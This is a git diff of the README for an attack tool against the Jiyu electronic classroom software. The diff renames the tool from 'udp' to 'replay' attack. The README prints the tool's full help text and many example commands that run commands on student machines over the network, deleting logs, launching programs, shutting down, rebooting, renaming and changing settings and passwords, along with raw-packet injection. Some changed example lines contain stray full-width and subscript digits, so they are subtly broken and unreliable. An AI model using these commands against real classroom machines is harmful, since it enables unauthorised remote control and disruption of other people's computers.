@@ -1,6 +1,6 @@
-# Jiyu_udp_attack
+# Jiyu_replay_attack
 
-[![GitHub release](https://img.shields.io/github/release/weilycoder/Jiyu_udp_attack.svg)](https://github.com/weilycoder/Jiyu_udp_attack/releases/latest)
+[![GitHub release](https://img.shields.io/github/release/weilycoder/Jiyu_replay_attack.svg)](https://github.com/weilycoder/Jiyu_replay_attack/releases/latest)
 
 利用极域电子教室的 udp 包攻击学生机。
 
@@ -20,12 +20,12 @@
 
 ## Usage
 
-你可以从 Python 导入 `Jiyu_udp_attack` 模块，也可以使用命令行 `python Jiyu_udp_attack`。
+你可以从 Python 导入 `Jiyu_replay_attack` 模块，也可以使用命令行 `python Jiyu_replay_attack`。
 
-使用 `python Jiyu_udp_attack -h` 来获取帮助信息：
+使用 `python Jiyu_replay_attack -h` 来获取帮助信息：
 
 ```
-usage: Jiyu_udp_attack [-h] [-f <ip>] [-fp <port>] [-t [<ip> ...]] [-tp <port>]
+usage: Jiyu_replay_attack [-h] [-f <ip>] [-fp <port>] [-t [<ip> ...]] [-tp <port>]
                        [-i <ip_id>] [-m <msg> | -w <url> | -c <command> |
                        -e <program> [<args> ...] |
                        -s [<timeout> [<message> ...]] |
@@ -36,7 +36,7 @@ usage: Jiyu_udp_attack [-h] [-f <ip>] [-fp <port>] [-t [<ip> ...]] [-tp <port>]
 
 Jiyu Attack Script
 
-Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ 
+Github Repositories: https://github.com/weilycoder/Jiyu_replay_attack/tree/main/ 
 
 options:
   -h, --help            show this help message and exit
@@ -78,28 +78,28 @@ Attack Action:
                         Rename the target machine
   --setting [<setting-args>]
                         Set specific settings on the target machine
-                        Use `Jiyu_udp_attack --setting` for help
+                        Use `Jiyu_replay_attack --setting` for help
   --hex <hex_data>      Send raw hex data to the target machine
   --pkg <custom_data> [<args> ...]
                         Custom packet data to send
 
 Example usage:
-    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"
-    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com
-    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
-    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe
-    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe
-    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."
-    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."
-    python Jiyu_udp_attack -t 192.168.106.255 -cw
-    python Jiyu_udp_attack -t 192.168.106.100 -ctw
-    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000
-    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000
-    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
-    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
-    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
-    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello
-    python Jiyu_udp_attack -t 127.0.0.1 --setting
+    python Jiyu_replay_attack -t 192.168.106.100 -m "Hello World"
+    python Jiyu_replay_attack -t 192.168.106.104 -w https://www.github.com
+    python Jiyu_replay_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
+    python Jiyu_replay_attack -t 224.50.50.42 -e calc.exe
+    python Jiyu_replay_attack -t 224.50.50.42 --maximize-execute notepad.exe
+    python Jiyu_replay_attack -t 224.50.50.42 -s 60 "System is going to shutdown."
+    python Jiyu_replay_attack -t 192.168.106.105-120 -r 30 "Rebooting."
+    python Jiyu_replay_attack -t 192.168.106.255 -cw
+    python Jiyu_replay_attack -t 192.168.106.100 -ctw
+    python Jiyu_replay_attack -t 192.168.106.100 -n hacker 1000
+    python Jiyu_replay_attack -t 192.168.106.100 --hex 444d4f43000001002a020000
+    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
+    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
+    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0}{1.size_8₀₀}" 4d hello
+    python Jiyu_replay_attack -t 192.168.106.1００ --pkg test.txt １０２４ hello
+    python Jiyu_replay_attack -t 127.0.0.1 --setting
 ```
 
 ### Specify the IP
@@ -132,7 +132,7 @@ Example usage:
 由于 `--setting` 的配置过于复杂，程序将其的配置项传入另一个命令行解析器，帮助文档如下：
 
 ```
-usage: Jiyu_udp_attack <main-args> --setting="[setting-options]"
+usage: Jiyu_replay_attack <main-args> --setting="[setting-options]"
 
 Specify settings for the target machine
 
@@ -169,9 +169,9 @@ Other Settings:
                         Set the visibility of the setup name button (default: auto)
 
 Example usage:
-    python Jiyu_udp_attack -t 192.168.233.0/24 --setting=""
-    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"
-    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
+    python Jiyu_replay_attack -t 192.168.233.0/24 --setting=""
+    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"
+    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
 ```
 
 ### `--pkg`
